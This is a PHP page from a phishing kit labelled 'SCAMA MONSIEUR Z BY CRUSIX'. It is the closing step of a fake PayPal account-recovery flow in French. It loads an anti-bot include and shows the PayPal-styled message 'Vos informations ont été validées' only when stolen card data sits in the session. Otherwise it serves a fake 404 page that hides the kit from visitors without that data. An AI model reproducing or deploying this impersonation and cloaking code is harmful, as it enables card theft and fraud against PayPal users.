<?php
ob_start();
session_start();
include('../ANTIBOTS/antibots.php');
/*
SCAMA MONSIEUR Z
BY CRUSIX
FINISHED.PHP
*/


if(isset($_SESSION['card'])){
?>
<html>

<head>

	<title>Compte rétabli</title>

<link rel="shortcut icon"  href="../RESSOURCES/img/favicon.ico">
	<meta http-equiv="content-type" content="text/html; charset=UTF-8"><

	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico"><link rel="apple-touch-icon" href="https://www.paypalobjects.com/en_US/i/pui/apple-touch-icon.png">
	
	 <link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/ui-web/ui-web/header-footer/1.40.0/header-footer.min.css"/>
	 <link rel="stylesheet" href="https&#x3A;&#x2F;&#x2F;www&#x2E;paypalobjects&#x2E;com&#x2F;web&#x2F;res&#x2F;8e3&#x2F;d82ddff5440cabffa0e5ff6e4bc94&#x2F;css/app.css">

</head>




<div style="background-color: #F7F7F7;"class="vx_modal-glimpse vx-modal-component-modal-outer submission-info-modal-outer vx_modalPrepToOpen vx_modalIsOpen" role="dialog" aria-describedby="submissionInfoModal-header" id="submissionInfoModal" aria-label="Modal Dialog"><div class="vx_modal-wrapper vx-modal-component-modal-wrapper submission-info-modal-wrapper"><div class="logo vx-modal-component-modal-logo submission-info-modal-logo"></div><div class="vx_modal-content vx-modal-component-content submission-info-content">            <div class="vx-modal-component-info-success submission-info-success"></div><p class="vx_text-1 vx-modal-component_HeadText-1 submission-info-vx_text-1">Vos informations ont été validées.</p><div class="done-btn"><a href="https://paypal.com"><button href="https://cutt.ly/jx2eA7V" class="btn btn-primary continue vx_btn vx_btn-block vx-modal-component-btn-style submission-info-vx_btn-block vx-modal-component_btn-block submission-info-close-action">Mon compte </button></a></div></div><div class="page"><div class="contents"><div class="loading"></div></div></div></div></div>
</html>



<?php
            }

            else{

             header("HTTP/1.0 404 Not Found");
  die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
          }




        ?>